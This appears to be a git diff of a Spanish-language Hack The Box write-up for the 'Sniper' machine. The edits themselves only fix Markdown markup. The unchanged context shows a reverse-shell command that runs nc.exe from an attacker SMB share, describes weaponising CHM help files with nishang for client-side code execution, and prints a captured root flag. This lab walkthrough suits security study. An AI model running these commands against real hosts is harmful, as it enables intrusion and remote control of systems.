@@ -1,5 +1,5 @@
 ---
-layouts: single
+layout: single
 title: Sniper - Hack The Box 
 excerpt: "Sniper es una máquina Windows de dificultad media que cuenta con un servidor PHP. El servidor aloja un archivo que se encuentra vulnerable a la inclusión local y remota de archivos. La ejecución de comandos se obtiene en el servidor en el contexto de `NT AUTHORITY\\iUSR` a través de la inclusión local de archivos PHP Session maliciosamente diseñados. Las credenciales expuestas de la base de datos se utilizan para obtener acceso como el usuario 'Chris', que tiene la misma contraseña. La enumeración revela que el administrador está revisando archivos CHM (Ayuda HTML compilada), que pueden utilizarse para filtrar el hash NetNTLM-v2 del administrador. Este puede ser capturado, descifrado y utilizado para obtener un shell inverso como administrador utilizando un objeto de credenciales PowerShell."
 date: 2023-09-11
@@ -332,7 +332,7 @@ Y ejecutamos comando como el usuario Chris para mandarnos una revershell usando 
 ```
 PS C:\inetpub\wwwroot> Invoke-Command -ComputerName $env:COMPUTERNAME -Credential $cred -ScriptBlock {\\10.10.14.15\share\nc.exe 10.10.14.15 9001 -e powershell}
 ```
->><p style="font-size: 16px;">NOTA: Si notas que falla la conexión, intenta reiniciar tu servidor SMB.</p>
+><p style="font-size: 16px;">NOTA: Si notas que falla la conexión, intenta reiniciar tu servidor SMB.</p>
 
 ```
 ┌─[ot3ro@parrot]─[~/HTB/Sniper]
@@ -418,7 +418,7 @@ cd689b38697b2fcab562d41d6519373e  instructions.chm
 
 En sí no vemos nada relevante en el contenido del archivo, pero investigando más a fondo podemos descubrir que existe un vector de ataque relacionado con los binarios 'chm'.
 
->><p style="font-size: 16px;">Los delincuentes pueden abusar de los archivos HTML compilados (.chm) para ocultar código malicioso. Los archivos CHM se distribuyen habitualmente como parte del sistema de ayuda HTML de Microsoft. Los archivos CHM son compilaciones comprimidas de diversos contenidos, como documentos HTML, imágenes y lenguajes de programación relacionados con scripts/web, como VBA, JScript, Java y ActiveX. El contenido CHM se muestra utilizando componentes subyacentes del navegador Internet Explorer cargados por el programa ejecutable de Ayuda HTML (hh.exe). Un archivo CHM personalizado que contenga cargas útiles incrustadas podría ser entregado a una víctima y luego ser activado por la Ejecución de Usuario. La ejecución de CHM también puede eludir el control de aplicaciones en sistemas antiguos y/o sin parches que no tengan en cuenta la ejecución de binarios a través de hh.exe.</p>
+><p style="font-size: 16px;">Los delincuentes pueden abusar de los archivos HTML compilados (.chm) para ocultar código malicioso. Los archivos CHM se distribuyen habitualmente como parte del sistema de ayuda HTML de Microsoft. Los archivos CHM son compilaciones comprimidas de diversos contenidos, como documentos HTML, imágenes y lenguajes de programación relacionados con scripts/web, como VBA, JScript, Java y ActiveX. El contenido CHM se muestra utilizando componentes subyacentes del navegador Internet Explorer cargados por el programa ejecutable de Ayuda HTML (hh.exe). Un archivo CHM personalizado que contenga cargas útiles incrustadas podría ser entregado a una víctima y luego ser activado por la Ejecución de Usuario. La ejecución de CHM también puede eludir el control de aplicaciones en sistemas antiguos y/o sin parches que no tengan en cuenta la ejecución de binarios a través de hh.exe.</p>
 
 Para aprovechar que podemos ejecutar archivos binarios chm en el sistema, ahora vamos a usar también una **máquina virtual Windows** de atacante y vamos a trabajar con el framework de 'nishang', especificamente trabajaremos con el script 'Out-CHM.ps1' que sirve para crear archivos chm maliciosos para la explotación del lado del cliente. También es importante descargar el programa 'htmlhelp.exe'(es un programa ejecutable de Windows que se utiliza para abrir y visualizar archivos de ayuda en formato CHM) que nos creará un directorio llamado "HTML Help Workshop". 
 
@@ -465,7 +465,7 @@ Mode                 LastWriteTime         Length Name
 
 ```
 Luego nos transferimos el archivo doc.chm de nuestra máquina Windows a nuestra máquina linux usando nuestro servidor SMB.
->><p style="font-size: 16px;">NOTA: Cada vez que vayas a transeferir un archivo desde la máquina Windows al servidor SMB de tu máquina Linux, es probable que tengas que ir creando una sesión SMB con autenticación, ej. "<p style="color: gray;">impacket-smbserver share -smb2support $(pwd) -user guest -password guest</p> y desde la máquina Windows mapear una unidad de red local, ej. <p style="color: gray;">net use n: \\10.10.14.15\share /user:guest guest</p>ya después de crear la unidad de red, ahora sí puedes transferir el archivo de la sig. manera:<p style="color: gray;">copy c:\'archivo' n:"
+><p style="font-size: 16px;">NOTA: Cada vez que vayas a transeferir un archivo desde la máquina Windows al servidor SMB de tu máquina Linux, es probable que tengas que ir creando una sesión SMB con autenticación, ej. "<p style="color: gray;">impacket-smbserver share -smb2support $(pwd) -user guest -password guest</p> y desde la máquina Windows mapear una unidad de red local, ej. <p style="color: gray;">net use n: \\10.10.14.15\share /user:guest guest</p>ya después de crear la unidad de red, ahora sí puedes transferir el archivo de la sig. manera:<p style="color: gray;">copy c:\'archivo' n:"
 
 Una vez que tengamos nuestro archivo malicioso chm en nuestra máquina de atacante, ahora debemos descargar el archivo desde la máquina Windows víctima como el usuario 'Chris':
 ```
@@ -487,7 +487,7 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 21:07:45.767327 IP 10.10.14.15 > 10.10.10.151: ICMP echo reply, id 1, seq 24, length 40
 
 ```
->><p style="font-size: 16px;">Es importante que busques un directorio en el sistema que te permita ejecutar el archivo chm, en mi caso lo hice desde el directorio "Docs"</p>
+><p style="font-size: 16px;">Es importante que busques un directorio en el sistema que te permita ejecutar el archivo chm, en mi caso lo hice desde el directorio "Docs"</p>
 
 Y vemos que tcpdump capturó el tráfico ICMP generado por la máquina víctima 10.10.10.151. Hemos comprobado la ejecución remota de código a través de un archivo binario chm. Ahora vamos a intentar ejecutar una revershell a nuestra máquina Linux siguiendo el mismo principio anterior:
 
@@ -672,3 +672,4 @@ PS C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
 d7f1325940032e33ac759b19d18693d7
 ```
 Y capturamos otra vez la flag root.txt
+
